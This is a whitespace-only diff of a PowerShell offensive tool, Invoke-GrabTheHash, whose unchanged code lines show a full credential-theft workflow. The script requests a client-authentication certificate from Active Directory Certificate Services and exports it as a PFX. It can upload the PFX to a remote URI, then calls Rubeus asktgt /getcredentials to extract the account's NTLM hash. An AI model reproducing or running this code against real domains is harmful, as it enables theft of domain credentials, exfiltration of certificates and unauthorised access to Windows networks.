@@ -75,12 +75,12 @@ function Invoke-GrabTheHash
   		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[switch]$DC
 	)
-	
+
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
-	
+
 	Write-Output ""
-	
+
 	if($Machine){
 		$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
 		if($isAdmin){}
@@ -97,7 +97,7 @@ function Invoke-GrabTheHash
 
 		Write-Output "[-] Domain switch not provided. Enumerating the Domain Name..."
 		Write-Output ""
- 
+
 		try{
 			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 			$currentDomain = $currentDomain.Name
@@ -119,14 +119,14 @@ function Invoke-GrabTheHash
 			$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
 			$ldapConnection.Path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
 			$ldapConnection.AuthenticationType = "None"
-			
+
 			$searcher = New-Object System.DirectoryServices.DirectorySearcher
 			$searcher.SearchRoot = $ldapConnection
 			$searcher.Filter = "(objectClass=pKICertificateTemplate)"
 			$searcher.SearchScope = "Subtree"
-			
+
 			$results = $searcher.FindAll()
-			
+
 			$AllTemplates = foreach ($result in $results) {
 				$templateName = $result.Properties["name"][0]
 				$templateName
@@ -137,7 +137,7 @@ function Invoke-GrabTheHash
    			Write-Output ""
 			Write-Output "[+] Certificates that permit client authentication:"
 			Write-Output ""
-			
+
 			$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(pkiExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
 			$searcher.SearchScope = "Subtree"
 
@@ -151,7 +151,7 @@ function Invoke-GrabTheHash
 			}
 
 			$ClientAuthTemplates | Sort
-			
+
 			# Dispose resources
 			$results.Dispose()
 			$searcher.Dispose()
@@ -169,9 +169,9 @@ function Invoke-GrabTheHash
 	}
 
  	if($PFX){
-		
+
 		$RubOutput = Rubeus asktgt /user:$CN /certificate:$PFX /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
-		
+
 		if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 			$ntlmValue = $Matches[1]
 			Write-Output "$CN NTLM hash: $ntlmValue"
@@ -180,7 +180,7 @@ function Invoke-GrabTheHash
 
 		break
 	}
-	
+
 	if(!$CAName){
 		$CertutilDump = certutil
 		$CertutilDump = ($CertutilDump | Out-String) -split "`n"
@@ -188,14 +188,14 @@ function Invoke-GrabTheHash
 		$CertutilDump = $CertutilDump | Where-Object { $_ -ne "" }
 		$caNames = $CertutilDump | Where-Object { $_ -match "Config:\s*(.*)" } | ForEach-Object { $matches[1] }
 	}
-	
+
 	if(!$CN){
 		$KlistDump = klist
 		$clientLine = $KlistDump | Where-Object { $_ -like "*Client:*" }
 		$clientName = (($clientLine[0] -split 'Client: ')[1] -split ' @')[0].Trim()
 		$CN = $clientName
 	}
-	
+
 	if($Machine){
 		if($TemplateName){}
 		else{
@@ -203,18 +203,18 @@ function Invoke-GrabTheHash
   			else{$TemplateName = "Machine"}
      		}
 	}
-	
+
 	else{$TemplateName = "User"}
-	
+
 	function Remove-ReqTempfiles()
 	{
 		param(
 			[String[]]$tempfiles
 		)
-		
+
 		if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'LocalMachine')}
 		else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'CurrentUser')}
-		
+
 		$certstore.Open('ReadWrite')
 		foreach($certreq in $($certstore.Certificates))
 		{
@@ -224,13 +224,13 @@ function Invoke-GrabTheHash
 			}
 		}
 		$certstore.close()
-		
+
 		foreach($file in $tempfiles){remove-item ".\$file" -ErrorAction silentlycontinue}
 	}
 
 	Write-Output "[+] Requesting certificate with subject $CN"
  	Write-Output ""
-	
+
 	if($Machine){
 	$file = @"
 [NewRequest]
@@ -244,7 +244,7 @@ RequestType = PKCS10
 CertificateTemplate = "$TemplateName"
 "@
 }
-	
+
 	else{
 	$file = @"
 [NewRequest]
@@ -271,7 +271,7 @@ CertificateTemplate = "$TemplateName"
 		break
 	}
 
-	if($CAName){	
+	if($CAName){
 		Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
 	}
 	else{
@@ -286,12 +286,12 @@ CertificateTemplate = "$TemplateName"
 			}
 			catch{continue}
 		}
-		
+
 		if(-not $success){
 			Invoke-Expression -Command "certreq -submit certreq.req $CN.cer" >$null 2>&1
 		}
 	}
-	
+
 	if(!($LastExitCode -eq 0))
 	{
 		Write-Output "[-] Certificate request failed"
@@ -312,7 +312,7 @@ CertificateTemplate = "$TemplateName"
 
 	if(($LastExitCode -eq 0) -and ($? -eq $true))
 	{}
-	
+
 	else
 	{
 		Write-Output "[-] Certificate request failed"
@@ -320,7 +320,7 @@ CertificateTemplate = "$TemplateName"
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 		break
 	}
-	
+
 	if($Machine){$cert = Get-Childitem "cert:\LocalMachine\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}
 	else{$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}
 
@@ -329,13 +329,13 @@ CertificateTemplate = "$TemplateName"
 	$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
 	Write-Output "[+] Certificate successfully exported to $pwd\$CN.pfx"
 	Write-Output ""
-	
+
 	if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'LocalMachine')}
 	else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')}
 	$certstore.Open('ReadWrite')
 	$certstore.Remove($cert)
 	$certstore.close()
-	
+
 	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 
  	if($Upload){
@@ -347,15 +347,15 @@ CertificateTemplate = "$TemplateName"
 		$uri = New-Object System.Uri($httpuri);
 		$webclient.UploadFile($uri, $file) | Out-Null
 	}
-	
+
 	if($Break){
 		Write-Output "[-] Stopping here, before grabbing the Hash"
 		Write-Output ""
 		break
 	}
-	
+
 	$RubOutput = Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
-	
+
 	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 		$ntlmValue = $Matches[1]
 		Write-Output "[+] $CN NTLM hash: $ntlmValue"
